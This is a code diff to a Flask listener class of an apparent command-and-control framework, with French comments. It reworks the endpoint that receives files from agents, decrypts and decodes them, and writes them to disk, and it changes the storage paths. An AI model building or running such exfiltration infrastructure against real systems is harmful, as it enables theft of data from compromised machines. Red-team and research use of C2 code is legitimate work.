@@ -22,8 +22,8 @@ class Listener():
         self.id   = name
         self.Path = "data/listeners/{}/".format(self.id)
         self.agentsPath = "{}agents/".format(self.Path)
-        self.agentsPath_download_files = "/opt/C2_download/"
-        self.agentsPath_upload_files = "/opt/C2_uploads/"
+        self.agentsPath_download_files = "./C2_download/"
+        self.agentsPath_upload_files = "./C2_uploads/"
         
         
         self.app = flask.Flask(__name__)
@@ -118,35 +118,33 @@ class Listener():
                 return(encrypted_path,200)
             else:
                 return("",204)
-        @self.app.route("/uploads/<name>", methods=['POST'])
+        @self.app.route("/uploads/<name>", methods=["POST"])
         def receivefile(name):
-            encoded_file = flask.request.form.get("file")
-            original_path = flask.request.form.get("path")
+            encoded_file  = request.form.get("file")
+            original_path = request.form.get("path")
+            if not all([encoded_file, original_path, name]):
+                return "Missing parameters", 400
 
-            if not encoded_file or not original_path or not name:
-                return ", 500
-
-            name_file = os.path.basename(original_path)
+            filename = os.path.basename(original_path)
 
             try:
-                encrypted_data = base64.b64decode(encoded_file)
-                decrypted_base64 = decode_this(encrypted_data, name)  # encore du base64 ici
-                original = base64.b64decode(decrypted_base64)         # ici, c’est les vraies données
+                # 1) Base64 → octets chiffrés
+                encrypted_data   = base64.b64decode(encoded_file)
+                # 2) Décryptage AES256 → chaîne Base64
+                decrypted_b64    = decode_this(encrypted_data, name)
+                # 3) Base64 → octets originaux
+                original_content = base64.b64decode(decrypted_b64)
             except Exception as e:
-                return "",500
+                return f"Decryption/decoding error: {e}", 500
 
-            full_path = os.path.join(self.agentsPath_download_files, name_file)
-
+            full_path = os.path.join(self.agentsPath_download_files, filename)
             try:
-                decoded_text = original.decode("utf-8")
-                with open(full_path, "w", encoding="utf-8") as f:
-                    f.write(decoded_text)
-            except UnicodeDecodeError:
+                # 4) Écriture en binaire
                 with open(full_path, "wb") as f:
-                    f.write(original)
-
-            displayResults(name, name_file)
-            return "", 200
+                    f.write(original_content)
+                return "", 200
+            except Exception as e:
+                return f"File write error: {e}", 500
         @self.app.route("/ftrans/<name>", methods=['GET'])
         def file_transfer(name):
             upload_flag_path = os.path.join(self.agentsPath, name, "upload")
